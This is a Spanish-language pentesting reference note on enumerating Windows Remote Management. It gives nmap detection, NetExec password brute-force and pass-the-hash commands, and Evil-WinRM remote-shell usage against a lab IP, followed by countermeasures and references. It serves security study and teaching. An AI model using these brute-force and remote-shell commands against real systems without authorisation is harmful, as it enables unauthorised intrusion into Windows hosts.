---
title: Enumeración WinRM (Windows Remote Management)
slug: enumeracion-winrm
aliases: [Enumeración WinRM (Windows Remote Management)]
fase: [Enumeración]
plataforma: Windows
dificultad: Básica
mitre: [T1021.006]
related: []
learning_refs: []
---

# Enumeración WinRM (Windows Remote Management)

## Descripción
WinRM (Windows Remote Management) es la implementacion de Microsoft del protocolo WS-Management, que permite la administración remota de sistemas Windows mediante PowerShell. Opera en el puerto 5985/tcp (HTTP) y 5986/tcp (HTTPS). La enumeración WinRM incluye: confirmar que el servicio esta activo, identificar la versión de Windows y realizar fuerza bruta de credenciales. Con credenciales validas y privilegios de administrador (indicado como "Pwn3d!" en CrackMapExec), se puede establecer una shell PowerShell interactiva completa.

## Herramientas
- **nmap** — detección y fingerprinting del servicio WinRM
- **NetExec** (`nxc`) — sucesor activo de CrackMapExec (archivado en 2024); fuerza bruta de credenciales y ejecución de comandos remotos
- **CrackMapExec** (`cme`) — herramienta legacy, archivada en 2024; reemplazada por NetExec
- **Evil-WinRM** — shell PowerShell interactiva completa sobre WinRM

## Comandos / Ejemplos

### Detección con Nmap
```bash
# Detectar WinRM en puerto 5985
nmap -A -p 5985 10.4.18.67
# Resultado:
# 5985/tcp open  http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
# Server: Microsoft-HTTPAPI/2.0
# OS estimado: Windows Server 2012 (93% probabilidad)

# Tambien verificar HTTPS en 5986
nmap -sV -p 5985,5986 TARGET
```

### Fuerza bruta con CrackMapExec
```bash
# Fuerza bruta de contrasena para usuario conocido
nxc winrm 10.4.18.67 -u administrator \
  -p /usr/share/wordlists/metasploit/unix_passwords.txt
# Resultado: [+] None\administrator:tinkerbell (Pwn3d!)
# "Pwn3d!" indica privilegios de administrador local

# Verificar credenciales y ejecutar comando
nxc winrm 10.4.18.67 -u administrator -p tinkerbell -x "whoami"

# Con lista de usuarios
nxc winrm 10.4.18.67 -u users.txt -p passwords.txt

# Pasar hash (Pass-the-Hash)
nxc winrm 10.4.18.67 -u administrator -H <NTLM_HASH>
```

### Shell interactiva con Evil-WinRM
```bash
# Conectar con usuario y contrasena
evil-winrm.rb -u administrator -p tinkerbell -i 10.4.18.67
# Resultado: *Evil-WinRM* PS C:\Users\Administrator\Documents>

# Conectar con hash NTLM (Pass-the-Hash)
evil-winrm.rb -u administrator -H <NTLM_HASH> -i 10.4.18.67

# Funcionalidades avanzadas de Evil-WinRM:
# upload local_file.txt C:\remote\file.txt
# download C:\remote\file.txt local_file.txt
# Invoke-Binary /ruta/ejecutable.exe
# menu  → listar funciones disponibles
```

**Indicadores de privilegios en CrackMapExec:**
- `(Pwn3d!)` → administrador local o domain admin → acceso completo
- Sin `(Pwn3d!)` → usuario sin privilegios de admin → acceso limitado

## Contramedidas
- Deshabilitar WinRM si no se necesita para administración remota: `Disable-PSRemoting -Force`
- Si se usa WinRM, restringir por firewall a IPs de administración autorizadas
- Usar HTTPS (puerto 5986) en lugar de HTTP (5985) para cifrar el trafico
- Configurar autenticación Kerberos en lugar de NTLM para WinRM
- Monitorear Event ID 4624 (logon type 3) y eventos de PowerShell Remoting
- Implementar JEA (Just Enough Administration) para restringir los comandos disponibles vía WinRM

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1021.006: Remote Services: Windows Remote Management. https://attack.mitre.org/techniques/T1021/006/
